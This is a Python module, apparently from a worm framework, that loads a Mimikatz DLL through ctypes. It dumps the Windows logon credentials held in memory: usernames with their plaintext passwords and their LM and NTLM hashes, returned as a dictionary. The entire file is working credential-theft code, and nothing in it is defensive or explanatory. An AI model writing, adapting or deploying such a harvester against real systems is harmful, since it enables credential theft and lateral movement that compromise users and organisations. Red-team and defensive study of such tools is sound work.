import binascii
import ctypes
import logging
import socket

__author__ = 'itay.mizeretz'

LOG = logging.getLogger(__name__)


class MimikatzCollector(object):
    """
    Password collection module for Windows using Mimikatz.
    """

    def __init__(self):
        try:

            self._isInit = False
            self._config = __import__('config').WormConfiguration
            self._dll = ctypes.WinDLL(self._config.mimikatz_dll_name)
            collect_proto = ctypes.WINFUNCTYPE(ctypes.c_int)
            get_proto = ctypes.WINFUNCTYPE(MimikatzCollector.LogonData)
            self._collect = collect_proto(("collect", self._dll))
            self._get = get_proto(("get", self._dll))
            self._isInit = True
        except Exception:
            LOG.exception("Error initializing mimikatz collector")

    def get_logon_info(self):
        """
        Gets the logon info from mimikatz.
        Returns a dictionary of users with their known credentials.
        """
        if not self._isInit:
            return {}
        LOG.debug("Running mimikatz collector")

        try:
            entry_count = self._collect()

            logon_data_dictionary = {}
            hostname = socket.gethostname()

            for i in range(entry_count):
                entry = self._get()
                username = entry.username.encode('utf-8').strip()

                password = entry.password.encode('utf-8').strip()
                lm_hash = binascii.hexlify(bytearray(entry.lm_hash))
                ntlm_hash = binascii.hexlify(bytearray(entry.ntlm_hash))

                if 0 == len(password):
                    has_password = False
                elif (username[-1] == '$') and (hostname.lower() == username[0:-1].lower()):
                    # Don't save the password of the host domain user (HOSTNAME$)
                    has_password = False
                else:
                    has_password = True

                has_lm = ("00000000000000000000000000000000" != lm_hash)
                has_ntlm = ("00000000000000000000000000000000" != ntlm_hash)

                if username not in logon_data_dictionary:
                    logon_data_dictionary[username] = {}
                if has_password:
                    logon_data_dictionary[username]["password"] = password
                if has_lm:
                    logon_data_dictionary[username]["lm_hash"] = lm_hash
                if has_ntlm:
                    logon_data_dictionary[username]["ntlm_hash"] = ntlm_hash

            return logon_data_dictionary
        except Exception:
            LOG.exception("Error getting logon info")
            return {}

    class LogonData(ctypes.Structure):
        """
        Logon data structure returned from mimikatz.
        """

        WINDOWS_MAX_USERNAME_PASS_LENGTH = 257
        LM_NTLM_HASH_LENGTH = 16

        _fields_ = \
            [
                ("username", ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
                ("password", ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
                ("lm_hash", ctypes.c_byte * LM_NTLM_HASH_LENGTH),
                ("ntlm_hash", ctypes.c_byte * LM_NTLM_HASH_LENGTH)
            ]
